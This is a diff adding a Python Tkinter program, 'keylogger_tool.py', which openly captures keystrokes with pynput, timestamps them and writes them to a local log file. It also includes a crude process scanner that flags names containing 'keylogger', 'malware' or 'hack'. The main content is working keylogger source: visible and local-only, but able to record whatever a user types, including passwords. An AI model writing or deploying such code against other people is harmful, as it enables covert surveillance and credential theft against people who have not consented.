@@ -1,0 +1,139 @@
+# keylogger_tool.py
+import os
+import psutil
+import time
+import ctypes
+import tkinter as tk
+from tkinter import ttk
+from threading import Thread
+from pynput import keyboard
+
+
+# ---------- Utility Functions ----------
+SUSPICIOUS_KEYWORDS = ["keylogger", "malware", "hack"]
+
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+def scan_processes():
+    suspicious_processes = []
+    for proc in psutil.process_iter(['pid', 'name', 'exe', 'cmdline']):
+        try:
+            proc_info = proc.info
+            cmdline = proc_info.get("cmdline") or []
+            full_cmd = " ".join(cmdline)
+            combined = (proc_info.get("name") or "") + " " + full_cmd
+            for keyword in SUSPICIOUS_KEYWORDS:
+                if keyword.lower() in combined.lower():
+                    suspicious_processes.append(proc_info)
+                    break
+        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+            continue
+    return suspicious_processes
+
+def kill_process(pid):
+    try:
+        p = psutil.Process(pid)
+        p.terminate()
+        return True
+    except Exception as e:
+        print(f"[!] Error killing process {pid}: {e}")
+        return False
+
+
+# ---------- GUI + Keylogger ----------
+class KeyloggerApp:
+    def __init__(self, root):
+        self.root = root
+        self.root.title("Keylogger Tool")
+        self.root.geometry("700x400")
+
+        self.log_text = tk.Text(root, wrap="word", height=15, width=80)
+        self.log_text.pack(pady=10)
+
+        self.start_btn = ttk.Button(root, text="Start Keylogger", command=self.start_in_thread)
+        self.start_btn.pack(side=tk.LEFT, padx=10)
+
+        self.stop_btn = ttk.Button(root, text="Stop Keylogger", command=self.stop_keylogger)
+        self.stop_btn.pack(side=tk.LEFT, padx=10)
+
+        self.save_btn = ttk.Button(root, text="Save Log", command=self.save_log)
+        self.save_btn.pack(side=tk.LEFT, padx=10)
+
+        self.scan_btn = ttk.Button(root, text="Scan Processes", command=self.scan_processes_ui)
+        self.scan_btn.pack(side=tk.LEFT, padx=10)
+
+        self.keylogger_running = False
+        self.log_file = "keylog.txt"
+
+    # ---------- Keylogger ----------
+    def start_keylogger(self):
+        self.keylogger_running = True
+        def on_press(key):
+            if not self.keylogger_running:
+                return False
+            try:
+                k = key.char
+            except AttributeError:
+                k = str(key)
+
+            ignore_keys = ['Key.shift', 'Key.ctrl', 'Key.alt', 'Key.caps_lock']
+            if k in ignore_keys or 'Key.' in k and k != 'Key.space':
+                return
+
+            timestamp = time.strftime("[%H:%M:%S] ")
+            if k == 'Key.space':
+                k = ' '
+
+            self.log_text.insert(tk.END, f"{timestamp}{k}\n")
+            self.log_text.see(tk.END)
+
+            with open(self.log_file, "a") as f:
+                f.write(f"{timestamp}{k}\n")
+
+        with keyboard.Listener(on_press=on_press) as listener:
+            listener.join()
+
+    def start_in_thread(self):
+        t = Thread(target=self.start_keylogger, daemon=True)
+        t.start()
+
+    def stop_keylogger(self):
+        self.keylogger_running = False
+        self.log_text.insert(tk.END, "\n[✔] Keylogger stopped.\n")
+        self.log_text.see(tk.END)
+
+    def save_log(self):
+        try:
+            with open(self.log_file, "r") as f:
+                content = f.read()
+            with open("saved_keylog.txt", "w") as f:
+                f.write(content)
+            self.log_text.insert(tk.END, "\n[✔] Log saved to 'saved_keylog.txt'\n")
+            self.log_text.see(tk.END)
+        except Exception as e:
+            self.log_text.insert(tk.END, f"\n[!] Error saving log: {e}\n")
+            self.log_text.see(tk.END)
+
+    def scan_processes_ui(self):
+        suspicious = scan_processes()
+        if suspicious:
+            self.log_text.insert(tk.END, "\n[!] Suspicious Processes Found:\n")
+            for proc in suspicious:
+                self.log_text.insert(tk.END, f"PID: {proc['pid']} - {proc['name']} {proc.get('cmdline', '')}\n")
+        else:
+            self.log_text.insert(tk.END, "\n[✔] No suspicious processes found.\n")
+        self.log_text.see(tk.END)
+
+
+# ---------- Main ----------
+if __name__ == "__main__":
+    if not is_admin():
+        print("[!] Warning: Not running as Administrator, some functions may not work.")
+
+    root = tk.Tk()
+    app = KeyloggerApp(root)
+    root.mainloop()
